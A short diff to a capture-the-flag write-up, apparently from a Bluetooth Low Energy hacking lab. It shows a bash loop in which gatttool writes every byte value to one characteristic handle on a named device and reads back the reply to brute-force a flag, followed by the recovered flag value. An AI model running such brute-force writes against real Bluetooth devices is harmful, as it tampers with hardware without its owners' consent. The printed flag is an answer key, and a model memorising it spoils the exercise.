@@ -74,14 +74,8 @@ entered the following code and save
 for i in {0..255}; do
     gatttool -b EC:E3:34:1C:0D:D2 --char-write-req -a 0x3c -n $(printf "%02X" "$i")
     flag="$(gatttool -b EC:E3:34:1C:0D:D2 --char-read -a 0x3c | cut -d: -f2 | xxd -r -p)"
-    if [[ "$flag" != "Brute force"* ]]; then
-        printf "FLAG from 0x%X: $flag\n" $i
-        exit 0
-    fi
+    echo "$flag"
 done
-
-echo "Flag NOT FOUND!"
-exit 1
 "
 run the code by -->bash hello.sh
 got the flag as --> 933c1fcfa8ed52d2ec05
